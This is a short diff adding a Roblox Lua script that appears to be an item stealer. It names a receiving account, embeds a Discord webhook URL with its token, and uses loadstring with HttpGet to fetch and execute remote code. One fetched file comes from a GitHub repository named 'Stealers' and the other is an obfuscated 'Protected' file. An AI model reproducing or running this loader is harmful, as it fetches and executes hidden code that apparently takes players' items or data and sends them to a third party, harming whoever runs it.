@@ -1,0 +1,5 @@
+Receiver = "SydearrItems"
+Webhook = "https://discord.com/api/webhooks/1336080815821422774/Rv9DkAs8ZERBSAUXAXNVp6EUipWyOchMdERmxtlB6yDJXoBK7Oa9CFF3pvR9UCyLuX38"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Stealers/refs/heads/main/losg.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/eZscripts999/guiiiii/refs/heads/main/Protected_4418461450530531.txt"))()
